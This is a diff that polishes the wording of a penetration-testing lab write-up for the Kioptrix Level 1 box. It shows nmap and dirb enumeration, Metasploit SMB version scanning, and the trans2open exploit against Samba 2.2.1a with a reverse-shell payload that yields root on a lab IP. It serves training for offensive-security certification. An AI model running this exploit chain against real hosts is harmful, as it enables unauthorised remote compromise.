@@ -1,26 +1,26 @@
 # OSCP Vulnhub Set 1 - Kioptrix: Level 1 (#1)
 
-lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=24ea2b8c-c02a-47a1-9db6-b7f021c301d8
+Lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=24ea2b8c-c02a-47a1-9db6-b7f021c301d8
 
-target ip: `10.101.85.11`
+Target IP: `10.101.85.11`
 
 ---
 
 ## Scanning and Enumeration
 
-### nmap
+### Nmap
 
-find the service that running on that target ip.
+Find the services that are running on the target IP.
 
 ```
 nmap -A -sC -sV 10.101.85.11
 ```
 
-- -A : Aggressive Scan
-- -sC : Default Script Scan
-- -sV : Version Detection
+- `-A`: Aggressive scan
+- `-sC`: Default script scan
+- `-sV`: Version detection
 
-now, i found the ssh, http, smb and etc. that running on terget ip.
+Now I found SSH, HTTP, SMB, and other services running on the target IP.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ccmtlab/01]
@@ -87,24 +87,23 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
 ```
 
-let's explore.
+Let's explore further.
 
 ---
 
-### http explore
+### HTTP Explore
 
-open the target ip in browser to find the way to enter the target machine.
-
+Open the target IP in a browser to look for an entry point.
 
 ```
 http://10.101.85.11
 ```
 
-nothing useful.
+The page does not reveal anything useful.
 
 ![](./images/01.png)
 
-i also open the page source but found nothing that useful now.
+I also opened the page source, but did not find anything useful yet.
 
 ```
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
@@ -195,13 +194,13 @@ by Red Hat Linux ]"></A>
 </HTML>
 ```
 
-find other directories, perhaps i could found the hidden things that useful.
+Find other directories, perhaps I can discover hidden content.
 
 ```
 dirb http://10.101.85.11/
 ```
 
-nothing useful.
+The initial result did not reveal anything useful.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ccmtlab/01]
@@ -244,20 +243,20 @@ END_TIME: Wed May 13 23:36:27 2026
 DOWNLOADED: 13836 - FOUND: 6
 ```
 
-i will leave the http exploring for a while and find the other way.
+I will pause HTTP exploration for now and pursue another path.
 
 ---
 
-### smb explore
+### SMB Explore
 
-the smb are interesting way for explore, let's investigate it by use `metasploit` and search for the smb version scanner module. 
+The SMB are interesting way for explore, let's investigate it by use `metasploit` and search for the SMB version scanner module. 
 
 ```
 msfconsole
 search smb_version
 ```
 
-the only one module that i can use is `auxiliary/scanner/smb/smb_version`.
+The only one module that i can use is `auxiliary/scanner/smb/smb_version`.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ccmtlab/01]
@@ -316,14 +315,14 @@ Matching Modules
 Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
 ```
 
-use it, and look to the setup requirement for this module.
+Use it, and look to the setup requirement for this module.
 
 ```
 use 0
 options 
 ```
 
-now, i know it need to set the rhost to target ip for run this module.
+Now, i know it need to set the RHOSTS to target IP for run this module.
 
 ```
 msf > use 0
@@ -342,14 +341,14 @@ Module options (auxiliary/scanner/smb/smb_version):
 View the full module info with the info, or info -d command.
 ```
 
-set the rhost to target ip and run it.
+Set the RHOSTS to target IP and run it.
 
 ```
 set RHOSTS 10.101.85.11
 run
 ```
 
-now, i know the version of smb is `unix (samba 2.2.1a)`.
+Now, i know the version of SMB is `Unix (Samba 2.2.1a)`.
 
 ```
 msf auxiliary(scanner/smb/smb_version) > set RHOSTS 10.101.85.11
@@ -360,21 +359,21 @@ msf auxiliary(scanner/smb/smb_version) > run
 [*] Auxiliary module execution completed
 ```
 
-i google it to search for the exploit, then i found this documentation.
+I google it to search for the exploit, then i found this documentation.
 
 ```
 https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/
 ```
 
-after reading this documentation, i know the `trans2open` module is effective against `samba 2.2.1a`.
+After reading this documentation, i know the `trans2open` module is effective against `Samba 2.2.1a`.
 
 ---
 
 ## Exploitation
 
-### trans2open
+### Trans2open
 
-let's search `trans2open` in `metasploit`.
+Let's search `trans2open` in `metasploit`.
 
 ```
 msf auxiliary(scanner/smb/smb_version) > search trans2open
@@ -396,14 +395,14 @@ Interact with a module by name or index. For example info 5, use 5 or use exploi
 After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'
 ```
 
-the `unix (samba 2.2.1a)` is also `linux`, so i will use the module 1 then look at setup requirement.
+The `Unix (Samba 2.2.1a)` is also `Linux`, so i will use the module 1 then look at setup requirement.
 
 ```
 use 1
 options
 ```
 
-i need to set the rhosts to target ip.
+I need to set the RHOSTS to target IP.
 
 ```
 msf auxiliary(scanner/smb/smb_version) > use 1
@@ -438,13 +437,14 @@ Exploit target:
 View the full module info with the info, or info -d command.
 ```
 
-set rhosts to target ip, then run it.
+Set RHOSTS to target IP, then run it.
+
 ```
 set RHOSTS 10.101.85.11
 run
 ```
 
-exploit success, but payload failure.
+Exploit success, but payload failure.
 
 ```
 msf exploit(linux/samba/trans2open) > set RHOSTS 10.101.85.11
@@ -468,12 +468,13 @@ msf exploit(linux/samba/trans2open) > run
 [*] 10.101.85.11 - Meterpreter session 4 closed.  Reason: Died
 ```
 
-look other payload.
+Look other payload.
+
 ```
 show payloads
 ```
 
-i decided to use a more stable payload, because the target service is quite old.
+I decided to use a more stable payload, because the target service is quite old.
 
 ```
 msf exploit(linux/samba/trans2open) > show payloads
@@ -521,14 +522,14 @@ Compatible Payloads
    35  payload/linux/x86/shell_reverse_tcp_ipv6          .                normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)
 ```
 
-i use payload 34, then try agin.
+I use payload 34, then try agin.
 
 ```
 set payload 34
 run
 ```
 
-now, i'm root.
+Now, i'm root.
 
 ```
 msf exploit(linux/samba/trans2open) > set payload 34
